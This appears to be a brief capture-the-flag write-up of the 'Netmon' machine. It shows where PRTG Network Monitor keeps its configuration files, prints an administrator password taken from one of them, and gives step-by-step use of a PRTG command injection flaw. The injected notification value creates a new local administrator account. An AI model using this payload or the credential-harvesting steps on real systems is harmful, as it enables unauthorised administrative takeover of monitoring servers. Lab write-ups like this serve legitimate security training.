# Netmon - PRTG config file / command injection

**PRTG configuration files located**

`C:\ProgramData\Paessler\PRTG Network Monitor`

**Config file named**

[image]

prtgadmin:PrTg@dmin2018

[image]

## PRTG < 18.2.39 Command Injection Vulnerability

Go to **Setup** → **Account Settings** → **Notifications**

[image]

Add new notification, scroll down to **Execute Program**:

```bash
test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add
```

[image]

Click the box next to the new notification, then the top icon of the bell to test the notification.

[image]

### administrator

[image]
